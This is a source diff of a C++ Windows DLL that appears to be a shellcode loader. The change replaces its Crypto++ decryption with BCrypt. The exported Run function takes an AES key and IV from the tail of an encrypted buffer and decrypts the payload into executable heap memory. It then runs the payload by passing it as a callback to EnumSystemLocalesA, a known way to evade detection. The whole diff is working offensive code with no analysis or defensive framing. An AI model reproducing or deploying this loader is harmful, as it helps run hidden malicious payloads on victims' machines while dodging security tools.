@@ -1,16 +1,10 @@
 #define WIN32_LEAN_AND_MEAN
 
 #include <Windows.h>
+#include <bcrypt.h>
+#include <functional>
 
-#include "aes.h"
-#include "filters.h"
-#include "modes.h"
-
-#ifdef _DEBUG
-#pragma comment(lib, "cryptlib")
-#else
-#pragma comment(lib, "cryptlibRelease")
-#endif
+#pragma comment(lib, "Bcrypt.lib")
 
 #ifdef LOADER_EXPORTS
 #define LOADER_API __declspec(dllexport)
@@ -18,57 +12,183 @@
 #define LOADER_API __declspec(dllimport)
 #endif
 
+#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
+#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
+
 extern "C" LOADER_API
-void Run(BYTE* cryptBuffer, SIZE_T cryptBufferSize)
+void Run(PBYTE pbCipherText, DWORD cbCipherText)
 {
-    BYTE key[CryptoPP::AES::DEFAULT_KEYLENGTH] = {0}, iv[CryptoPP::AES::BLOCKSIZE] = {0};
-    DWORD c = 0;
-	
-    for (DWORD i = cryptBufferSize - 32; i < cryptBufferSize - 16; i++)
+    BCRYPT_ALG_HANDLE       hAesAlg = NULL;
+    BCRYPT_KEY_HANDLE       hKey = NULL;
+    NTSTATUS                status = STATUS_UNSUCCESSFUL;
+    DWORD                   cbRawData = 0,
+					        cbData = 0,
+					        cbKeyObject = 0,
+					        cbBlockLen = 0;
+    PBYTE                   pbRawData = NULL,
+					        pbKeyObject = NULL,
+					        pbIV = NULL;
+    BYTE                    rgbIV[16] = {};
+    BYTE                    rgbAES128Key[16] = {};
+
+    memcpy(rgbAES128Key, &pbCipherText[cbCipherText - 32], 16);
+    memcpy(rgbIV, &pbCipherText[cbCipherText - 16], 16);
+
+    // Open an algorithm handle.
+    if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(
+        &hAesAlg,
+        BCRYPT_AES_ALGORITHM,
+        NULL,
+        0)))
     {
-        key[c] = cryptBuffer[i];
+        goto Cleanup;
     }
 
-    c = 0;
-
-    for (DWORD i = cryptBufferSize - 16; i < cryptBufferSize; i++)
+    // Calculate the size of the buffer to hold the KeyObject.
+    if (!NT_SUCCESS(status = BCryptGetProperty(
+        hAesAlg,
+        BCRYPT_OBJECT_LENGTH,
+        (PBYTE)&cbKeyObject,
+        sizeof(DWORD),
+        &cbData,
+        0)))
     {
-        iv[c] = cryptBuffer[i];
-    }
-	
-    CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption dec;
-    dec.SetKeyWithIV(key, sizeof(key), iv, sizeof(iv));
-
-    std::vector<BYTE> plainBuffer;
-    plainBuffer.resize(cryptBufferSize);
-
-    CryptoPP::ArraySink rs(&plainBuffer[0], plainBuffer.size());
-
-    const DWORD extra = CryptoPP::AES::BLOCKSIZE + CryptoPP::AES::DEFAULT_KEYLENGTH;
-	
-    CryptoPP::ArraySource s(
-        cryptBuffer,
-        cryptBufferSize - extra,
-        true,
-        new CryptoPP::StreamTransformationFilter(
-            dec,
-            new CryptoPP::Redirector(rs)
-        )
-    );
-
-    plainBuffer.resize(rs.TotalPutLength());
-
-    void* ha = nullptr;
-    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
-    if (hc)
-    {
-        ha = HeapAlloc(hc, 0, plainBuffer.size());
+        ;
+        goto Cleanup;
     }
 
-    if (ha)
+    // Allocate the key object on the heap.;
+    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
+    if (NULL == pbKeyObject)
     {
-        memcpy(&ha, plainBuffer.data(), plainBuffer.size());
-        EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
-        CloseHandle(ha);
+        goto Cleanup;
+    }
+
+    // Calculate the block length for the IV.
+    if (!NT_SUCCESS(status = BCryptGetProperty(
+        hAesAlg,
+        BCRYPT_BLOCK_LENGTH,
+        (PBYTE)&cbBlockLen,
+        sizeof(DWORD),
+        &cbData,
+        0)))
+    {
+        ;
+        goto Cleanup;
+    }
+
+    // Determine whether the cbBlockLen is not longer than the IV length.
+    if (cbBlockLen > sizeof(rgbIV))
+    {
+        ;
+        goto Cleanup;
+    }
+
+    // Allocate a buffer for the IV. The buffer is consumed during the 
+    // encrypt/decrypt process.
+    pbIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbBlockLen);
+    if (NULL == pbIV)
+    {
+        goto Cleanup;
+    }
+
+    memcpy(pbIV, rgbIV, cbBlockLen);
+
+    if (!NT_SUCCESS(status = BCryptSetProperty(
+        hAesAlg,
+        BCRYPT_CHAINING_MODE,
+        (PBYTE)BCRYPT_CHAIN_MODE_CBC,
+        sizeof(BCRYPT_CHAIN_MODE_CBC),
+        0)))
+    {
+        goto Cleanup;
+    }
+
+    // Generate the key from supplied input key bytes.
+    if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(
+        hAesAlg,
+        &hKey,
+        pbKeyObject,
+        cbKeyObject,
+        (PBYTE)rgbAES128Key,
+        sizeof(rgbAES128Key),
+        0)))
+    {
+        goto Cleanup;
+    }
+
+    ////
+    //// Get the output buffer size.
+    ////
+    if (!NT_SUCCESS(status = BCryptDecrypt(
+        hKey,
+        pbCipherText,
+        cbCipherText - 32,
+        NULL,
+        pbIV,
+        cbBlockLen,
+        NULL,
+        0,
+        &cbRawData,
+        BCRYPT_BLOCK_PADDING)))
+    {
+        goto Cleanup;
+    }
+
+    pbRawData = (PBYTE)HeapAlloc(
+        HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0),
+        0, cbRawData);
+    if (NULL == pbRawData)
+    {
+        goto Cleanup;
+    }
+
+    if (!NT_SUCCESS(status = BCryptDecrypt(
+        hKey,
+        pbCipherText,
+        cbCipherText - 32,
+        NULL,
+        pbIV,
+        cbBlockLen,
+        pbRawData,
+        cbRawData,
+        &cbRawData,
+        BCRYPT_BLOCK_PADDING)))
+    {
+        goto Cleanup;
+    }
+
+    EnumSystemLocalesA((LOCALE_ENUMPROCA)pbRawData, 0);
+
+Cleanup:
+
+    if (hAesAlg)
+    {
+        BCryptCloseAlgorithmProvider(hAesAlg, 0);
+    }
+
+    if (hKey)
+    {
+        BCryptDestroyKey(hKey);
+    }
+
+    if (pbCipherText)
+    {
+        HeapFree(GetProcessHeap(), 0, pbCipherText);
+    }
+
+    if (pbRawData)
+    {
+        HeapFree(GetProcessHeap(), 0, pbRawData);
+    }
+
+    if (pbKeyObject)
+    {
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+    }
+
+    if (pbIV)
+    {
+        HeapFree(GetProcessHeap(), 0, pbIV);
     }
 }
